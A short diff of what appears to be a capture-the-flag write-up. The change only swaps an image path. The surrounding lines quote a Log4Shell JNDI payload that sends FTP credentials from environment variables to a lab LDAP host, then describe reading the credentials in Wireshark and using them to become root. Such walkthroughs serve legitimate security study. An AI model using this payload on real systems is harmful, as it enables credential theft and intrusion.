@@ -156,6 +156,6 @@ ${jndi:ldap://10.10.14.13/user:${env:ftp_user}:password:${env:ftp_password}}
 
 The credentials can be viewed within `wireshark`.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>
 
 Using this password, we can `su` to `root`.&#x20;
